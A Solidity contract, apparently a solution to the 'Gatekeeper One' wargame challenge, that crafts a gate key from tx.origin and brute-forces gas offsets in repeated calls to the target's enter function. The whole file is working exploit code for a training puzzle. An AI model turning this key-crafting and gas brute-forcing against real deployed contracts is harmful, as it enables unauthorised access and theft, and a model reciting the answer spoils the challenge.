// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    function attack(address _target) external {
        bytes8 _gateKey = bytes8(uint64(1 << 63) + uint64(uint16(uint160(tx.origin))));
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), _gateKey);

        for (uint256 i = 100; i < 1000; i++) {
            (bool result, ) = address(_target).call{gas: i + 8191 * 10}(encodedParams);
            if (result) {
                break;
            }
        }
    }
}
